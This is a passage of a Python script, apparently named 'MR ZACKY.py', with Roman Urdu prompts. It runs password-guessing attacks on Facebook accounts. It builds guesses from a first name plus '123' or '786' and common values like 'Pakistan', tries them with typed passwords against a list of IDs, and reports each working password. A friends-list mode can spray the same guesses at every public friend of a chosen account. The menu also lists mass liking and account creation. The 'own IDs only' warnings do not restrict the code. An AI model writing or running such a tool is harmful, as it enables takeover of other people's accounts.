        print("Dono password match nahi kiye — kuch save nahi kiya. Dobara try karo.")
        return
    found["password"] = pw
    try:
        with open(p, "w", encoding="utf-8") as f:
            json.dump(entries, f, ensure_ascii=False, indent=2)
    except Exception as ex:
        print("Save nahi ho saka: %s" % ex)
        return
    print("Password save ho gaya — sirf is phone ki file mein (GitHub par nahi).")
    print("[9] se check kar ke dekh lo, [11] se password test kar lo.")


def _auto_passwords(first_name):
    """User ke bataye hue aam password — [11] me khud try hote hain.
    Sirf APNI IDs ke liye. first_name: ID ka first name (jaise Mansoor)."""
    cands = []
    names = []
    if first_name:
        fn = first_name.strip().split()[0]
        if fn:
            names.append(fn)
            if fn.lower() != fn:
                names.append(fn.lower())
    for fn in names:
        for tail in ("123", "1234", "1235", "786"):
            cands.append(fn + tail)
    for fixed in ("123456789", "12345678", "Pakistan", "pakistan", "786786"):
        cands.append(fixed)
    seen = set()
    out = []
    for c in cands:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out


def _ask_typed_passwords():
    """Yaad wale password ek dafa pooch lo (zyada se zyada 5)."""
    print("")
    print("Ab wo password do jo tumhe yaad hain (ek line me ek password,")
    print("khaali line de kar khatam karo — zyada se zyada 5).")
    print("Yehi password har ID par try honge.")
    import getpass
    typed = []
    for i in range(1, 6):
        try:
            pw = getpass.getpass("Password %d: " % i)
        except Exception:
            pw = input("Password %d: " % i)
        if not pw:
            break
        typed.append(pw)
    if not typed:
        print("Koi password nahi diya — sirf aam wale try karunga.")
    print("")
    return typed


def _check_id_list(queries, typed):
    """IDs ki list par password check karo. Returns (found_ok, not_found).
    found_ok: [(query, password)] — mil gaye, aage OK likha aata hai.
    not_found: [(query, reason)] — reason 'checkpoint' (aage CP likha
    aata hai) | 'lock' | 'network error' | 'koi password nahi laga' |
    'email nahi mila' | 'email se account nahi mila'.
    Sirf di hui IDs par try hota hai — koi aur ID nahi chhedi jati.
    Checkpoint/lock aate hi poora run ruk jata hai."""
    found_ok = []
    not_found = []
    stopped = False
    for qi, query in enumerate(queries, 1):
        if stopped:
            break
        print("--- ID %d / %d: %s ---" % (qi, len(queries), query))
        identifier = None
        id_kind = None
        found = None
        first_name = ""
        p = os.path.join(BASE, "my_ids.json")
        if os.path.exists(p):
            try:
                with open(p, "r", encoding="utf-8") as f:
                    data = json.load(f)
                entries = data if isinstance(data, list) else data.get("ids", [])
                for e in entries:
                    if isinstance(e, dict) and _match_my_id_entry(e, query):
                        found = e
                        break
            except Exception:
                pass
        if found:
            first_name = ((found.get("name") or "").strip().split() or [""])[0]
            email = (found.get("email") or "").strip()
            if email:
                identifier = email
                id_kind = "email"
                print("ID mili: %s — %s" % (found.get("name") or "-", email))
            else:
                print("ID mili: %s — is entry mein email nahi likha." % (found.get("name") or "-"))
        if not identifier:
            identifier, id_kind = _login_id_from_code(query)
            if identifier and id_kind == "username":
                print("List mein email nahi mila — username '%s' se try kar raha hun." % identifier)
            elif identifier and id_kind == "number":
                print("List mein email nahi mila — ID number '%s' se try kar raha hun." % identifier)
                print("(Number se login na hua to email poochunga.)")
        if not identifier:
            identifier = input("Is ID ka email likho: ").strip()
            id_kind = "email"
        if not identifier:
            print("Email ke baghair check nahi ho sakta.")
            not_found.append((query, "email nahi mila"))
            continue
        if not first_name:
            first_name = input("Is ID ka first name kya hai? (jaise Mansoor — khaali bhi chhod sakte ho): ").strip()
        auto = _auto_passwords(first_name)
        passwords = list(typed)
        for c in auto:
            if c not in passwords:
                passwords.append(c)
        print("Is ID par %d password try karunga (%d tumhare + %d aam wale)." % (len(passwords), len(typed), len(passwords) - len(typed)))
        print("")
        result, value = _try_passwords(identifier, passwords)
        if result == "ok":
            _print_check_ok(query, value)
            found_ok.append((query, value))
            continue
        if result == "checkpoint":
            print("CP — %s" % query)
            print("Facebook ne CHECKPOINT manga hai — ab ruk jao, browser me khud karo.")
            print("Baaqi IDs check nahi ki.")
            not_found.append((query, "checkpoint"))
            stopped = True
            continue
        if result == "locked":
            print("Facebook ne account ko temporarily lock kar diya — ab ruk jao, kuch der baad try karo.")
            print("Baaqi IDs check nahi ki.")
            not_found.append((query, "lock"))
            stopped = True
            continue
        if result == "error":
            print("Network error — internet check kar ke dobara try karo.")
            not_found.append((query, "network error"))
            continue
        if result == "nomatch":
            print("")
            print("In %d password mein se koi bhi nahi laga — sahi password in mein nahi hai." % len(passwords))
            if id_kind == "number":
                print("Ho sakta hai ID number (code) se login na hota ho — Facebook ko email chahiye.")
            if id_kind == "email":
                not_found.append((query, "koi password nahi laga"))
                continue
        elif result == "no_account":
            print("Is se koi account nahi mila — Facebook ko email chahiye.")
        print("")
        new_email = input("Is ID ka email likho (email se dobara check kar dunga): ").strip()
        if not new_email:
            print("Email ke baghair aage check nahi ho sakta.")
            not_found.append((query, "email nahi mila"))
            continue
        print("Email se dobara try kar raha hun...")
        result, value = _try_passwords(new_email, passwords)
        if result == "ok":
            _print_check_ok(query, value)
            found_ok.append((query, value))
        elif result == "nomatch":
            print("")
            print("In %d password mein se koi bhi nahi laga — sahi password in mein nahi hai." % len(passwords))
            not_found.append((query, "koi password nahi laga"))
        elif result == "checkpoint":
            print("CP — %s" % query)
            print("Facebook ne CHECKPOINT manga hai — ab ruk jao, browser me khud karo.")
            not_found.append((query, "checkpoint"))
            stopped = True
        elif result == "locked":
            print("Facebook ne account ko temporarily lock kar diya — ab ruk jao, kuch der baad try karo.")
            not_found.append((query, "lock"))
            stopped = True
        elif result == "error":
            print("Network error — internet check kar ke dobara try karo.")
            not_found.append((query, "network error"))
        elif result == "no_account":
            print("Is email se bhi koi account nahi mila — email ghalat ho sakta hai.")
            not_found.append((query, "email se account nahi mila"))
    print("")
    print("=== Nateeja ===")
    if found_ok:
        for code, pw in found_ok:
            print("OK — %s  |  Password: %s" % (code, pw))
    else:
        print("Kisi ID ka password nahi mila.")
    for code, why in not_found:
        if why == "checkpoint":
            print("CP — %s (checkpoint — browser me khud karo)" % code)
        else:
            print("Nahi mila: %s (%s)" % (code, why))
    print("Session save NAHI ki — login tum khud karo ge (cookie ya browser se).")
    return found_ok, not_found


def check_passwords():
    print(YELLOW + "=== Password Check Karo (apni ID ke liye) ===" + RESET)
    print("Sirf APNI ID ke liye — kisi aur ki ID par try mat karo.")
    print("Ek se zyada IDs bhi check kar sakte ho — comma se alag kar ke")
    print("likho, koi limit nahi. Har ID par tumhare diye hue password ke")
    print("saath tumhare bataye hue aam password bhi khud try honge:")
    print("first name + 123 / 1234 / 1235 / 786, 12345678, 123456789,")
    print("Pakistan, 786786.")
    print("Milne par aage OK likha aayega, checkpoint par CP likha aayega.")
    print("Ghalat password par Facebook account lock bhi kar sakta hai —")
    print("checkpoint/lock aate hi tool khud ruk jayega.")
    print("")
    raw = input("ID links / codes / emails do (comma se alag karo): ").strip()
    queries = [q.strip() for q in raw.split(",") if q.strip()]
    if not queries:
        print("Kuch nahi diya.")
        return
    typed = _ask_typed_passwords()
    _check_id_list(queries, typed)


def check_friends_passwords():
    """[13] Apni ID ke public friends mein se apni IDs dhoondo + password check karo.
    List mein saare dost naam ke saath dikhte hain — number likh kar chun lo,
    ya 'sab' likho (saari list check hogi). 'sab' sirf tab likho jab saari
    list tumhari apni IDs hon. Sirf wohi IDs check hoti hain jo tum chunoge
    ya 'sab' likh kar confirm karo ge — bina chune kisi dost par password
    kabhi try nahi hota."""
    print(YELLOW + "=== Public Friends Mein Se Apni IDs Check Karo ===" + RESET)
    print("Apni ID ka code/link do — us ID ki PUBLIC friends list khulegi.")
    print("List mein saare dost naam ke saath dikhenge. Phir ya to number")
    print("likh kar chun lo, ya 'sab' likho — 'sab' se saari list check")
    print("hogi. 'sab' sirf tab likho jab saari list tumhari apni IDs ho.")
    print("")
    who = input("Apni ID ka code / link / username do: ").strip()
    if not who:
        print("Kuch nahi diya.")
        return
    friends = []
    session_ok = False
    if load_cookies():
        name, link = fb_whoami()
        if name:
            print("Login hai: %s" % name)
            session_ok = True
        else:
            print("Cookie save hai par session nahi chal rahi (expire ho sakti hai).")
            print("[8] se dobara login karo, phir [13] dabao.")
            print("Ya friends.html file wala tareeqa use karo (neeche).")
    if session_ok:
        print("Login session se friends list khol raha hun...")
        friends = _fetch_friends_online(who)
        if not friends:
            print("Page khula par dost nahi mile — ho sakta hai:")
            print("- us ID ki friends list public nahi hai (sirf us ke dost dekh sakte hain), ya")
            print("- username/link ghalat hai, ya")
            print("- us ID ke koi public dost nahi hain.")
            print("File wala tareeqa try karta hun.")
    if not friends:
        found_file = None
        for fname in ("friends.html", "friends.mhtml", "public-friends.html",
                      "public-friends.json", "MR-ZACKY-friends-ids.txt"):
            p = os.path.join(BASE, fname)
            if os.path.exists(p):
                found_file = fname
                if fname.endswith(".json"):
                    friends = load_json(p)
                elif fname.endswith(".txt"):
                    friends = load_friends_ids_txt(p)
                else:
                    friends = load_friends_file(p)
                print("%s se parha gaya." % fname)
                break
        if not found_file:
            print("friends.html nahi mili — is liye list nahi ban saki.")
            print("")
            print("Tareeqa:")
            print("1. Browser me us ID ki profile kholo, Friends tab par jao.")
            print("2. Page ko save karo (Chrome: menu > Download / Save page).")
            print("3. File ka naam friends.html rakho aur is folder me daalo.")
            print("4. Phir [13] dabao.")
            print("Ya [7] se list banao (MR-ZACKY-friends-ids.txt) — phir [13]")
            print("usi list se check karega.")
            print("Login ho to [8] se login karo — phir [13] seedha fetch karega.")
            return
    if not friends:
        print("Friends list khaali hai.")
        return
    my_ids = set()
    my_names = set()
    p = os.path.join(BASE, "my_ids.json")
    if os.path.exists(p):
        try:
            with open(p, "r", encoding="utf-8") as f:
                data = json.load(f)
            entries = data if isinstance(data, list) else data.get("ids", [])
            for e in entries:
                if isinstance(e, dict):
                    if e.get("fb_id"):
                        my_ids.add(str(e.get("fb_id")))
                    link = e.get("profile_link") or ""
                    fid = id_from_url(link) if link else None
                    if fid:
                        my_ids.add(str(fid))
                    nm = (e.get("name") or "").strip().lower()
                    if nm:
                        my_names.add(nm)
                        my_names.add(nm.split()[0])
        except Exception:
            pass
    print("")
    print("Dost mile: %d" % len(friends))
    in_list_idx = []
    for i, (name, fid, url) in enumerate(friends, 1):
        mark = ""
        if str(fid) in my_ids:
            mark = "  <-- LIST MEIN HAI (tumhari ID)"
            in_list_idx.append(i)
        elif (name or "").strip().lower() in my_names:
            mark = "  <-- NAAM MILTA HAI (shayad tumhari ID — number se chun lo)"
        print("%d. %s — %s%s" % (i, name, fid, mark))
    print("")
    pick = input("Kaun si check karun? Number likho, comma se alag karo — ya 'sab' likho (saari list check hogi). 'sab' sirf tab likho jab saari list tumhari apni IDs hon; khaali Enter = sirf list wali: ").strip()
    chosen = []
    if pick.lower() in ("sab", "all"):
        chosen = list(friends)
    elif pick:
        for part in pick.split(","):
            part = part.strip()
            if part.isdigit():
                n = int(part)
                if 1 <= n <= len(friends):
                    chosen.append(friends[n - 1])
    else:
        chosen = [friends[i - 1] for i in in_list_idx]
    if not chosen:
        print("Koi ID nahi chuni.")
        return
    print("")
    print("Check kar raha hun: %d IDs" % len(chosen))
    typed = _ask_typed_passwords()
    queries = []
    for name, fid, url in chosen:
        queries.append(url if url else fid)
    _check_id_list(queries, typed)

def menu():
    show_banner()
    # Login ho to upar hi dikha do ke is time kaun si ID logged in hai.
    if load_cookies():
        name, link = fb_whoami()
        if name:
            print(GREEN + "Logged in: " + RESET + "%s (%s)" % (name, link))
    while True:
        show_menu()
        try:
            choice = input("Option chunno: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nAllah Hafiz!")
            return
        if choice == "1":
            friends_list()
        elif choice == "2":
            try:
                n = int(input("Kitne passwords chahiye? (default 5): ").strip() or "5")
            except ValueError:
                n = 5
            random_passwords(n)
        elif choice == "3":
            username = input("Facebook username do (jaise Man50or): ").strip()
            username_to_id(username)
        elif choice == "4":
            group_input = input("Facebook group ka link do (jaise facebook.com/groups/1234567890): ").strip()
            group_to_id(group_input)
        elif choice == "5":
            group_members()
        elif choice == "6":
            check_members_public()
        elif choice == "7":
            friends_ids()
        elif choice == "8":
            fb_login()
        elif choice == "9":
            search_lists()
        elif choice == "10":
            like_comment()
        elif choice == "11":
            check_passwords()
        elif choice == "12":
            add_password_to_list()
        elif choice == "13":
            check_friends_passwords()
        elif choice == "14":
            send_likes_multi()
        elif choice == "15":
            check_post_counts()
        elif choice == "16":
            create_facebook_id()
        elif choice == "0":
            print("Allah Hafiz!")
            return
        else:
            print("Ghalat option — 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 ya 0 likho.")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "passwords":
        try:
            n = int(sys.argv[2]) if len(sys.argv) > 2 else 5
        except ValueError:
            n = 5
        random_passwords(n)
    elif len(sys.argv) > 1 and sys.argv[1] == "friends":
        friends_list()
    elif len(sys.argv) > 1 and sys.argv[1] == "id":
        if len(sys.argv) > 2:
            username_to_id(sys.argv[2])
        else:
            print("Username bhi do: python3 \"MR ZACKY.py\" id Man50or")
    elif len(sys.argv) > 1 and sys.argv[1] == "group":
        if len(sys.argv) > 2:
            group_to_id(sys.argv[2])
        else:
            print("Group ka link bhi do: python3 \"MR ZACKY.py\" group https://www.facebook.com/groups/1234567890")
    elif len(sys.argv) > 1 and sys.argv[1] == "members":
        group_members()
    elif len(sys.argv) > 1 and sys.argv[1] == "check-public":
        check_members_public()
    elif len(sys.argv) > 1 and sys.argv[1] == "friends-ids":
        friends_ids()
    elif len(sys.argv) > 1 and sys.argv[1] == "login":
        fb_login()
    elif len(sys.argv) > 1 and sys.argv[1] == "search":
        search_lists(sys.argv[2] if len(sys.argv) > 2 else None)
    elif len(sys.argv) > 1 and sys.argv[1] == "like":
        like_comment("like", sys.argv[2] if len(sys.argv) > 2 else None)
    elif len(sys.argv) > 1 and sys.argv[1] == "comment":
        like_comment("comment", sys.argv[2] if len(sys.argv) > 2 else None)
    elif len(sys.argv) > 1 and sys.argv[1] == "check":
        check_passwords()
    elif len(sys.argv) > 1 and sys.argv[1] == "setpw":
        add_password_to_list()
    elif len(sys.argv) > 1 and sys.argv[1] == "friends-check":
        check_friends_passwords()
    elif len(sys.argv) > 1 and sys.argv[1] == "likes":
        want = 10
        try:
            want = int(sys.argv[3]) if len(sys.argv) > 3 else 10
        except ValueError:
            want = 10
        send_likes_multi(sys.argv[2] if len(sys.argv) > 2 else None, want)
    elif len(sys.argv) > 1 and sys.argv[1] == "check":
        check_post_counts(sys.argv[2] if len(sys.argv) > 2 else None)
    elif len(sys.argv) > 1 and sys.argv[1] == "create-id":
        create_facebook_id()
    else:
        menu()
